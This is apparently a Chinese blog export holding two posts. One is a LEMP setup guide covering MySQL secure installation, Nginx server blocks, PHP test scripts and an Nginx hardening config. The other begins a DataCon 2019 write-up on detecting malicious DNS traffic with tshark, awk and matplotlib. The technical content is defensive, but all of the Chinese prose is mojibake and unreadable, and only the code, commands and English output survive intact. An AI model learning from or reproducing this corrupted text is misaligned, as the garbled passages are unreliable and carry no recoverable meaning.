ä¸ºäº†ç¡®ä¿å®‰è£…ï¼ŒMySQLé™„å¸¦äº†ä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†è¯¢é—®æˆ‘ä»¬æ˜¯å¦è¦ä¿®æ”¹ä¸€äº›ä¸å®‰å…¨çš„é»˜è®¤å€¼ã€‚é”®å…¥ä»¥ä¸‹å‘½ä»¤å¯åŠ¨è„šæœ¬ï¼š 1sudo mysql_secure_installation æ­¤è„šæœ¬å°†è¯¢é—®æ‚¨æ˜¯å¦è¦é…ç½®VALIDATE PASSWORD PLUGINï¼š 123456789101112ca0y1h@ubuntu18042:~$ sudo mysql_secure_installationSecuring the MySQL server deployment.Connecting to MySQL using a blank password.VALIDATE PASSWORD PLUGIN can be used to test passwordsand improve security. It checks the strength of passwordand allows the users to set only those passwords which aresecure enough. Would you like to setup VALIDATE PASSWORD plugin?Press y|Y for Yes, any other key for No: è¾“å…¥yï¼Œæ¥ä¸‹æ¥è„šæœ¬è¿˜ä¼šè¦æ±‚ä½ é€‰æ‹©å¯†ç éªŒè¯çº§åˆ«ï¼š 1234567There are three levels of password validation policy:LOW Length &gt;= 8MEDIUM Length &gt;= 8, numeric, mixed case, and special charactersSTRONG Length &gt;= 8, numeric, mixed case, special characters and dictionary filePlease enter 0 = LOW, 1 = MEDIUM and 2 = STRONG: è¾“å…¥1é€‰æ‹©ä¸­ç­‰å¯†ç å¼ºåº¦ï¼Œæ¥ä¸‹æ¥ï¼Œç³»ç»Ÿä¼šè¦æ±‚æ‚¨æäº¤å¹¶ç¡®è®¤rootå¯†ç ï¼š 123456New password: Re-enter new password: Estimated strength of the password: 100 Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) : y æ¥ä¸‹æ¥MySQLè„šæœ¬å°†åˆ é™¤ä¸€äº›åŒ¿åç”¨æˆ·å’Œæµ‹è¯•æ•°æ®åº“ï¼Œç¦ç”¨è¿œç¨‹rootç™»å½•ï¼Œå¹¶åŠ è½½è¿™äº›æ–°è§„åˆ™ï¼š 1234567891011121314151617181920212223242526By default, a MySQL installation has an anonymous user,allowing anyone to log into MySQL without having to havea user account created for them. This is intended only fortesting, and to make the installation go a bit smoother.You should remove them before moving into a productionenvironment.Remove anonymous users? (Press y|Y for Yes, any other key for No) : ySuccess.--snip--By default, MySQL comes with a database named &#x27;test&#x27; thatanyone can access. This is also intended only for testing,and should be removed before moving into a productionenvironment.--snip--Reloading the privilege tables will ensure that all changesmade so far will take effect immediately.Reload privilege tables now? (Press y|Y for Yes, any other key for No) : ySuccess.All done! æœ€åéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿è¡ŒMySQL 5.7ï¼ˆåŠæ›´é«˜ç‰ˆæœ¬ï¼‰çš„Ubuntuç³»ç»Ÿä¸­ï¼Œå¦‚æœæ˜¯ä»¥rootèº«ä»½ç”¨æˆ·å¯åŠ¨mysqlå‘½ä»¤æ—¶ï¼Œæ ¹MySQLç”¨æˆ·è®¾ç½®ä¸ºauth_socketé»˜è®¤ä½¿ç”¨æ’ä»¶è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯ä½¿ç”¨å¯†ç è¿›è¡Œèº«ä»½éªŒè¯ã€‚å¦‚æœéœ€è¦å…è®¸å¤–éƒ¨ç¨‹åºï¼ˆä¾‹å¦‚phpMyAdminï¼‰è®¿é—®ç”¨æˆ·æ—¶ï¼Œä¼šå‡ºç°è®¿é—®å—é™çš„æƒ…å†µã€‚ è¿™æ ·å°±éœ€è¦å°†å…¶èº«ä»½éªŒè¯æ–¹æ³•ä»åˆ‡æ¢auth_socketä¸ºmysql_native_passwordï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥æ¯ä¸ªMySQLç”¨æˆ·å¸æˆ·ä½¿ç”¨çš„èº«ä»½éªŒè¯æ–¹æ³•ï¼š 12345678910mysql&gt; SELECT user,authentication_string,plugin,host FROM mysql.user;+------------------+-------------------------------------------+-----------------------+-----------+| user | authentication_string | plugin | host |+------------------+-------------------------------------------+-----------------------+-----------+| root | | auth_socket | localhost || mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost || mysql.sys | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost || debian-sys-maint | *A38295EEEA729FDFC0C36C8E270DDA27005B7693 | mysql_native_password | localhost |+------------------+-------------------------------------------+-----------------------+-----------+4 rows in set (0.00 sec) è¿è¡Œä»¥ä¸‹ALTER USERå‘½ä»¤ï¼Œæ›´æ”¹passwordä¸ºä¸Šè¿°æ­¥éª¤é€‰æ‹©çš„å¼ºå¯†ç ï¼š 1mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;password&#x27;; ç„¶åï¼Œè¿è¡ŒFLUSH PRIVILEGESå‘Šè¯‰æœåŠ¡å™¨é‡æ–°åŠ è½½æˆæƒè¡¨å¹¶ä½¿æ–°çš„æ›´æ”¹ç”Ÿæ•ˆï¼š 1mysql&gt; FLUSH PRIVILEGES; é…ç½®æ ¹MySQLç”¨æˆ·ä½¿ç”¨å¯†ç è¿›è¡Œèº«ä»½éªŒè¯åï¼Œå°†æ— æ³•å†sudo mysqlä½¿ç”¨å…ˆå‰ä½¿ç”¨çš„å‘½ä»¤è®¿é—®MySQL ã€‚ç›¸åï¼Œå¿…é¡»è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1mysql -u root -p è¾“å…¥åˆšåˆšè®¾ç½®çš„å¯†ç åï¼Œå°†çœ‹åˆ°MySQLæç¤ºç¬¦ã€‚ æ­¤æ—¶ï¼Œæ•°æ®åº“ç³»ç»Ÿç°å·²è®¾ç½®å®Œæ¯•ï¼Œæ¥ä¸‹æ¥ç»§ç»­å®‰è£…PHPã€‚ å®‰è£…PHP&amp;é…ç½®Nginx Install php-fpm ä¸Apacheä¸åŒï¼ŒNginxä¸åŒ…å«æœ¬åœ°PHPå¤„ç†ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¿…é¡»å®‰è£…PHP-FPMï¼ˆFastCGI Process Managerï¼‰ã€‚FPMæ˜¯å¦ä¸€ç§PHP FastCGIå®ç°ï¼Œå…·æœ‰ä¸€äº›å¯¹é‡è½½ç«™ç‚¹æœ‰ç”¨çš„é™„åŠ åŠŸèƒ½ã€‚å¦å¤–è¿˜éœ€è¦å®‰è£…php-mysqlä»¥å…è®¸PHPä¸MySQLæ•°æ®åº“é€šä¿¡ã€‚ 1$ sudo apt install php-fpm php-mysql æŸ¥çœ‹PHPæ˜¯å¦å®‰è£…æˆåŠŸï¼š 12345$ php --versionPHP 7.2.19-0ubuntu0.18.04.1 (cli) (built: Jun 4 2019 14:48:12) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.2.19-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies Configure Nginx for PHP ç°åœ¨å·²ç»å®‰è£…äº†æ‰€æœ‰å¿…éœ€çš„LEMPå †æ ˆç»„ä»¶ï¼Œä½†ä»éœ€è¦è¿›è¡Œä¸€äº›Nginxé…ç½®æ›´æ”¹ã€‚è¿™æ˜¯åœ¨æœåŠ¡å™¨å—çº§åˆ«å®Œæˆçš„ï¼ˆæœåŠ¡å™¨å—ç±»ä¼¼äºApacheçš„è™šæ‹Ÿä¸»æœºï¼‰ã€‚ åœ¨/etc/nginx/sites-available/ç›®å½•ä¸­æ‰“å¼€æ–°çš„æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ–°æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶å‘½åexample.comï¼š 1$ sudo vim /etc/nginx/sites-available/example.com å°†ä»¥ä¸‹å†…å®¹ï¼ˆä»é»˜è®¤æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶ä¸­è·å–å¹¶ç•¥å¾®ä¿®æ”¹ï¼‰æ·»åŠ åˆ°æ–°æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶ä¸­ï¼š 12345678910111213141516171819server &#123; listen 80; root &#x2F;var&#x2F;www&#x2F;html; index index.php index.html index.htm index.nginx-debian.html; server_name SERVER_IP_ADDRESS; location &#x2F; &#123; try_files $uri $uri&#x2F; &#x3D;404; &#125; location ~ \\.php$ &#123; include snippets&#x2F;fastcgi-php.conf; fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock; &#125; location ~ &#x2F;\\.ht &#123; deny all; &#125;&#125; éœ€è¦æ³¨æ„ä¸¤ä¸ªåœ°æ–¹ï¼š åœ¨index.htmlå‰é¢æ·»åŠ index.php ç¡®ä¿fastcgi_pass å¥—æ¥å­—è·¯å¾„æ˜¯æ­£ç¡®çš„ æ·»åŠ æ­¤å†…å®¹åï¼Œä¿å­˜å¹¶å…³é—­è¯¥æ–‡ä»¶ã€‚é€šè¿‡ä»æ–°æœåŠ¡å™¨å—é…ç½®æ–‡ä»¶ï¼ˆåœ¨/etc/nginx/sites-available/ç›®å½•ä¸­ï¼‰åˆ°/etc/nginx/sites-enabled/ç›®å½•åˆ›å»ºç¬¦å·é“¾æ¥æ¥å¯ç”¨æ–°æœåŠ¡å™¨å—ï¼š 1$ sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/ ç„¶åï¼Œä»/sites-enabled/ç›®å½•ä¸­å–æ¶ˆé“¾æ¥é»˜è®¤é…ç½®æ–‡ä»¶ï¼š 1$ sudo unlink /etc/nginx/sites-enabled/default æ³¨æ„ï¼šå¦‚æœæ‚¨éœ€è¦æ¢å¤é»˜è®¤é…ç½®ï¼Œå¯ä»¥é€šè¿‡é‡æ–°åˆ›å»ºç¬¦å·é“¾æ¥æ¥æ‰§è¡Œæ­¤æ“ä½œï¼š 1$ sudo ln -s /etc/nginx/sites-available/default /etc/nginx/sites-enabled/ ä»¥ä¸‹å‘½ä»¤å¯ä»¥æµ‹è¯•æ–°é…ç½®æ–‡ä»¶çš„è¯­æ³•é”™è¯¯ï¼š 1$ sudo nginx -t å‡†å¤‡å¥½åï¼Œé‡æ–°åŠ è½½Nginxçš„é…ç½®æ–‡ä»¶ï¼š 1$ sudo systemctl reload nginx Create a PHP file to Test Configuration åœ¨/var/www/html/ä¸‹æ–°å»ºinfo.phpæ–‡ä»¶ 1$ sudo vim /var/www/html/info.php åœ¨æ–°æ–‡ä»¶ä¸­å†™å…¥ä»¥ä¸‹ä»£ç ï¼š 12&lt;?phpphpinfo(); ç°åœ¨å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è®¿é—®http://Server_IP_Address/info.php/ï¼Œåº”è¯¥çœ‹åˆ°PHPç”Ÿæˆçš„ç½‘é¡µï¼Œå…¶ä¸­åŒ…å«æœ‰å…³æ‚¨çš„æœåŠ¡å™¨çš„ä¿¡æ¯ï¼š éªŒè¯ç»“æœ Connect MySQL åœ¨/var/www/html/å»ºç«‹ä¸€ä¸ªæ–°æ–‡ä»¶test_sql.phpï¼š 1234567891011121314&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;; // åˆ›å»ºè¿æ¥$conn = new mysqli($servername, $username, $password); // æ£€æµ‹è¿æ¥if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot; . $conn-&gt;connect_error);&#125; echo &quot;è¿æ¥æˆåŠŸ&quot;;?&gt; è¿è¡Œç»“æœï¼š Create Database åœ¨ä¸Šä¸€ä¸ªæ­¥éª¤çš„åŸºç¡€ä¸Šï¼Œä¿®æ”¹test_sql.phpæ–‡ä»¶ï¼š 12345678910111213141516171819202122&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;; // åˆ›å»ºè¿æ¥$conn = new mysqli($servername, $username, $password);// æ£€æµ‹è¿æ¥if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot; . $conn-&gt;connect_error);&#125; // åˆ›å»ºæ•°æ®åº“$sql = &quot;CREATE DATABASE testPHP&quot;;if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;æ•°æ®åº“åˆ›å»ºæˆåŠŸ&quot;;&#125; else &#123; echo &quot;Error creating database: &quot; . $conn-&gt;error;&#125; $conn-&gt;close();?&gt; è¿è¡Œç»“æœï¼š Create Table åœ¨ä¸Šä¸€ä¸ªæ­¥éª¤çš„åŸºç¡€ä¸Šï¼Œç»§ç»­ä¿®æ”¹test_sql.phpæ–‡ä»¶ï¼š 123456789101112131415161718192021222324252627282930&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;$dbname = &quot;testPHP&quot;; // åˆ›å»ºè¿æ¥$conn = new mysqli($servername, $username, $password, $dbname);// æ£€æµ‹è¿æ¥if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot; . $conn-&gt;connect_error);&#125; // ä½¿ç”¨ sql åˆ›å»ºæ•°æ®è¡¨$sql = &quot;CREATE TABLE VIPMembers (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, firstname VARCHAR(30) NOT NULL,lastname VARCHAR(30) NOT NULL,email VARCHAR(50),reg_date TIMESTAMP)&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;Table MyGuests created successfully&quot;;&#125; else &#123; echo &quot;åˆ›å»ºæ•°æ®è¡¨é”™è¯¯: &quot; . $conn-&gt;error;&#125; $conn-&gt;close();?&gt; è¿è¡Œç»“æœï¼š Insert Record åœ¨ä¸Šä¸€ä¸ªæ­¥éª¤çš„åŸºç¡€ä¸Šï¼Œç»§ç»­ä¿®æ”¹test_sql.phpæ–‡ä»¶ï¼š 123456789101112131415161718192021222324&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;$dbname = &quot;myDB&quot;; // åˆ›å»ºè¿æ¥$conn = new mysqli($servername, $username, $password, $dbname);// æ£€æµ‹è¿æ¥if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot; . $conn-&gt;connect_error);&#125; $sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;)&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;æ–°è®°å½•æ’å…¥æˆåŠŸ&quot;;&#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;&#125; $conn-&gt;close();?&gt; è¿è¡Œç»“æœï¼š æœåŠ¡å™¨åŠ å›º æœ¬ç« ä¸»è¦ç›®çš„æ˜¯ä»‹ç»å¦‚ä½•é€šè¿‡ä¼˜åŒ– Nginx é»˜è®¤é…ç½®ï¼Œæé«˜ Nginx Web æœåŠ¡å™¨çš„å®‰å…¨æ€§ã€‚å…¶ä¸­æ³¨é‡Šå¸¦æœ‰ADDæ˜¯ç›¸å¯¹äºé»˜è®¤é…ç½®çš„æ–°å¢é¡¹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163user www-data;worker_processes auto;pid /run/nginx.pid;include /etc/nginx/modules-enabled/*.conf;events &#123; worker_connections 768; # multi_accept on;&#125;http &#123; ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; ## # éšè—Nginxç‰ˆæœ¬å· ## server_tokens off; ## # ADD: é€šè¿‡å…³é—­æ…¢è¿æ¥æ¥æŠµå¾¡ä¸€äº›DDOSæ”»å‡» ## # è¯»å–å®¢æˆ·ç«¯è¯·æ±‚ä½“çš„è¶…æ—¶æ—¶é—´ client_body_timeout 5s; # è¯»å–å®¢æˆ·ç«¯è¯·æ±‚å¤´çš„è¶…æ—¶æ—¶é—´ client_header_timeout 5s; # è¶…æ—¶æ—¶é—´ä¹‹åä¼šå…³é—­è¿™ä¸ªè¿æ¥ keepalive_timeout 75s; ## # ADD: ## # å®¢æˆ·ç«¯è¯·æ±‚çš„httpå¤´éƒ¨ç¼“å†²åŒºå¤§å° client_header_buffer_size 2k; # å®¢æˆ·ç«¯è¯·æ±‚çš„ä¸€äº›æ¯”è¾ƒå¤§çš„å¤´æ–‡ä»¶åˆ°ç¼“å†²åŒºçš„æœ€å¤§å€¼ large_client_header_buffers 4 4k; ## # ADD: é˜²æ­¢æ¶æ„æµé‡çš„çŸ­æ—¶é—´å¤§é‡è¯·æ±‚ ## # ç”¨æˆ·çš„IPåœ°å€$binary_remote_addrä½œä¸ºKeyï¼Œæ¯ä¸ªIPåœ°å€æ¯ç§’å¤„ç†10ä¸ªè¯·æ±‚ limit_req_zone $binary_remote_addr zone=ConnLimitZone:10m rate=10r/s; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings # ADD: è¦è®©httpså’Œhttpå¹¶å­˜ï¼Œä¸èƒ½åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨ssl on ## # ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE # ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings # ADD: å¼€å¯gzipæé«˜é¡µé¢åŠ è½½é€Ÿåº¦ ## gzip on; gzip_vary on; gzip_proxied any; gzip_comp_level 6; gzip_buffers 16 8k; gzip_http_version 1.1; gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; server &#123; server_name localhost; listen 80; ## # ADD: æ¸…é™¤ä¸å®‰å…¨çš„HTTPå“åº”å¤´ ## more_clear_headers &quot;X-Powered-By&quot;; more_clear_headers &quot;Server&quot;; more_clear_headers &quot;ETag&quot;; more_clear_headers &quot;Connection&quot;; more_clear_headers &quot;Date&quot;; more_clear_headers &quot;Accept-Ranges&quot;; more_clear_headers &quot;Last-Modified&quot;; ## # ADD: é¿å…ç‚¹å‡»åŠ«æŒ ## add_header X-Frame-Options &quot;SAMEORIGIN&quot;; ## # ADD: é˜²XSSæ”»å‡» ## add_header X-XSS-Protection &quot;1; mode=block&quot;; ## # ADD: ç¦ç”¨ä¸å®‰å…¨çš„HTTPæ–¹æ³• ## if ($request_method !~ ^(GET|HEAD|POST)$ ) &#123; return 405; &#125; ## # ADD: é™æ€èµ„æº ## location ~* \\.(js|css|flash|media|jpg|png|gif|dll|cab|CAB|ico|vbs|json|ttf|woff|eot|map)$ &#123; # ç¼“å­˜30å¤© add_header Cache-Control &quot;max-age=2592000&quot;; &#125; ## # ADD: é™æ€é¡µé¢ ## location ~* \\.html$ &#123; # ä¸ç¼“å­˜ add_header Cache-Control &quot;no-cache&quot;; &#125; &#125;&#125;#mail &#123;# # See sample authentication script at:# # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript# # # auth_http localhost/auth.php;# # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;# # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;# # server &#123;# listen localhost:110;# protocol pop3;# proxy on;# &#125;# # server &#123;# listen localhost:143;# protocol imap;# proxy on;# &#125;#&#125; Summaryï¼š åœ¨å†™è¿™ç¯‡å­¦ä¹ æ–‡æ¡£ä¹‹å‰ï¼Œæˆ‘å¯¹NginxæœåŠ¡å™¨å®‰å…¨åŠ å›ºè¿˜æ˜¯å¤„äºå®Œå…¨æ— çŸ¥çš„çŠ¶æ€ï¼Œçœ‹åˆ°å‚è€ƒèµ„æ–™çš„ä¸€äº›é…ç½®éƒ½æœ‰äº›äº‘é‡Œé›¾é‡Œï¼Œä½†æ˜¯æˆ‘åˆæ¯”è¾ƒå–œæ¬¢â€œæŠ˜è…¾â€ï¼Œæ¯ä¸ªé˜¶æ®µæˆåŠŸåéƒ½ä¼šå¯¹è™šæ‹Ÿæœºè¿›è¡Œå¿«ç…§ï¼Œé˜²æ­¢ç¯å¢ƒæ— æ³•æ¢å¤ã€‚ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡ä¿®æ”¹Nginxçš„é»˜è®¤é…ç½®ï¼Œå¯ä»¥å¯¹NginxæœåŠ¡å™¨çš„â€œå…ˆå¤©æ€§â€ç¼ºé™·è¿›è¡Œä¸»åŠ¨é˜²å¾¡ï¼Œæ¯”å¦‚ï¼šå…³é—­ç‰ˆæœ¬ä¿¡æ¯ã€å…³é—­æ…¢è¿æ¥ã€è®¾ç½®é™æ€èµ„æºå’Œé™æ€é¡µé¢çš„ç¼“å­˜æ—¶é—´ç­‰ç­‰ï¼Œè¿™æ ·å°±å¯ä»¥æ•´ä½“ä¸Šé˜²æ­¢æœåŠ¡å™¨å—åˆ°å¸¸è§çš„æ”»å‡»ã€‚ å¦å¤–ï¼Œè¿˜å¯ä»¥æ·»åŠ IPç™½åå•å’ŒIPé»‘åå•ï¼Œä»¥åŠè®¾ç½®Naxsiè‡ªå®šä¹‰è§„åˆ™ã€‚ Q&amp;A Nginxä¸­sites-availableå’Œsites-enabledçš„åŒºåˆ« sites-availableæ˜¯å­˜æ”¾å½“å‰çš„serveré…ç½®, åœ¨è¿™é‡Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼› sites-enabledæ˜¯æ¿€æ´»å¹¶ä½¿ç”¨çš„serveré…ç½®ï¼ˆä»sites_availableçš„æ–‡ä»¶åˆ›å»ºå¿«æ·æ–¹å¼åˆ°sites-enabledï¼‰ ln -så‘½ä»¤ å…·ä½“ä½¿ç”¨æ–¹æ³• NginxæœåŠ¡å™¨å®‰å…¨åŠ å›ºå‚è€ƒæ–‡æ¡£ https://www.cnblogs.com/RiwellAckerman/p/11273705.html https://my.oschina.net/jiaoyanli/blog/1510174 https://blog.csdn.net/JY_He/article/details/52299884 https://bbs.ichunqiu.com/thread-36091-1-1.html","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"},{"name":"LEMP","slug":"LEMP","permalink":"http://ca0y1h.top/tags/LEMP/"},{"name":"Nginx","slug":"Nginx","permalink":"http://ca0y1h.top/tags/Nginx/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Datacon2019-q1-Writeup-v2","date":"2019-07-21T06:15:38.000Z","path":"Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2/","text":"DataCon æ–¹å‘ä¸€ DNSæ¶æ„æµé‡æ£€æµ‹ WriteUp Review-v2 è¿™ä¸€è½®æµé‡åˆ†æä¸»è¦æ˜¯åˆ†æä¸ºä¸»ï¼Œä»¥è¿™ç¯‡Writeupä¸ºå‚è€ƒï¼Œæœ‰å…³DNSçš„æ”»å‡»ç±»å‹ã€æ”»å‡»æ‰‹æ®µå’Œæ”»å‡»ç‰¹å¾ï¼Œè¯¦è§DNSæ”»å‡»æµé‡åˆ†æè¯†åˆ«-v1 0x00 ç³»ç»Ÿç¯å¢ƒ Windows10 64bitï¼› wireshark 3.0.3 (v3.0.3-0-g6130b92b0ec6) ï¼› TShark (Wireshark) 3.0.3 (v3.0.3-0-g6130b92b0ec6)ï¼› Cmder 18026 previewï¼› python 3.7ï¼› Excel 2016 0x01 æœªæˆæƒçš„Dynamic Update **åˆ‡å…¥ç‚¹ï¼š**ç²—ç•¥è§‚å¯Ÿç»å¤§éƒ¨åˆ†DNSåŒ…çš„Opcodeéƒ½æ˜¯0ï¼ˆStandard Queryï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ†æOpcodeä¸ä¸ºé›¶çš„ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç­›é€‰ï¼š dns and not dns.flags.opcode==0 å¯ä»¥çœ‹åˆ°ï¼Œå…¨éƒ¨éƒ½æ˜¯DNS Dynamic Updateè¯·æ±‚ã€‚æ¥ä¸‹æ¥ï¼Œä½¿ç”¨åœ¨Cmderä¸­ä½¿ç”¨tsharkå‘½ä»¤ç­›é€‰å‡ºæ‰€æœ‰çš„æ”»å‡»IPï¼š tshark.exe -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst |awk '&#123;print $1&quot;-&gt;&quot;$2&#125;' &gt; DynamicDNSip.csv ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªæ”»å‡»æ¥æºï¼š19.220.251.87 414ï¼Œ200.152.141.106 15ï¼Œ18.100.48.86 4091ï¼Œ237.205.156.233 535ã€‚ç”±äºæ­£å¸¸çš„Dynamic Update ä¸ä¼šå‘é€è¿™ä¹ˆå¤šä¸”è¿™ä¹ˆé¢‘ç¹çš„è¯·æ±‚ï¼Œè€Œä¸”æ¶‰åŠåˆ°äºŒçº§åŸŸåcom.cnä»¥åŠå¾ˆå¤šå…¶ä»–ä¸åŒåŸŸåçš„æ›´æ–°ï¼Œå› æ­¤æˆ‘ä»¬è®¤ä¸ºè¿™äº›éƒ½æ˜¯æ”»å‡»ã€‚å†ä½¿ç”¨ä¸‹é¢ä¸€è¡Œå‘½ä»¤æŠŠä»–ä»¬é€‰å‡ºæ¥ï¼š tshark.exe -r q1_final.pcap -Y &quot;dns and not dns.flags.opcode == 0 and dns.flags.response == 0&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,5&quot;; ip[$2] += 1&#125;' &gt; DynamicDNS.csv ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(5) è¾“å‡ºåˆ°äº†DynamicDNS.csv 0x02 åå°„æ”¾å¤§æ”»å‡» **åˆ‡å…¥ç‚¹ï¼š**æˆ‘ä»¬æ¥ä¸‹æ¥å†çœ‹çœ‹é™¤äº†A(1) å’ŒAAAA(28) è¿™ä¸¤ä¸ªå¸¸è§ç±»å‹ä»¥å¤–çš„DNS è¯·æ±‚ã€‚ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åŠ¨ wiresharkï¼š wireshark -r q1_final.pcap -R &quot;dns and not dns.query.type in &#123;1, 28&#125; and dns.flags.opcode == 0&quot; å¦‚å›¾æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæ‚ä¸ƒæ‚å…«çš„DNS è¯·æ±‚ã€‚ä¸ºä¾¿äºè§‚å¯Ÿï¼Œæˆ‘ä»¬æŒ‰ç…§è¯·æ±‚ç±»å‹æ’åºã€‚ç®€å•æµè§ˆä¸€ä¸‹ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå‘ç°ä¸€äº›æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åå°„æ”¾å¤§æ”»å‡»ï¼š ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç»Ÿè®¡å„IPçš„è¿›/å‡ºæµé‡ï¼š tshark -r q1_final.pcap -T fields -e ip.src -e ip.dst -e frame.len | awk '&#123;send[$1] += $3; rece[$1] += 0; rece[$2] += $3; send[$2] += 0;&#125; END &#123;for(ip in send) if(rece[ip] == 0) tmp = 1e60; else tmp = send[ip]/rece[ip]; for(ip in send) print ip, send[ip], rece[ip], tmp; &#125;' &gt; send_rece.csv ä¸ºäº†æ›´å®¹æ˜“è§‚å¯Ÿè¿™äº›IPçš„æµé‡ç‰¹å¾ï¼Œå¯ä»¥ä½¿ç”¨Pythonçš„matplotlibæ¨¡å—ä½œå›¾ï¼š 1234567891011121314151617181920212223242526import matplotlib.pyplot as pltimport csvsend = []rece = []ip = []with open(&#x27;send_rece.csv&#x27; ,&#x27;r&#x27;) as csvfile: plots = csv.reader(csvfile, delimiter=&#x27; &#x27;) for row in plots: if row[0] == &#x27;45.80.170.1&#x27;: continue send.append(int(row[1])) rece.append(int(row[2])) ip.append(row[0])fig, ax = plt.subplots()ax.scatter(send, rece, label=&#x27;&#x27;)for i, txt in enumerate(ip): if send[i] &gt; 8e6 or rece[i] &gt; 8e6: ax.annotate(txt, (send[i], rece[i]))plt.xlabel(&#x27;send&#x27;)plt.ylabel(&#x27;receive&#x27;)plt.title(&#x27;&#x27;)plt.legend()plt.show() ä¸ºä»€ä¹ˆè¦æ’é™¤45.80.170.1ï¼š æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 45.80.170.1&quot;æŸ¥çœ‹ç›¸å…³æµé‡ï¼š å¯ä»¥çœ‹å‡ºè¿™ä¸ªIPæ˜¯ä¸€ä¸ªDNSæœåŠ¡ã€‚ 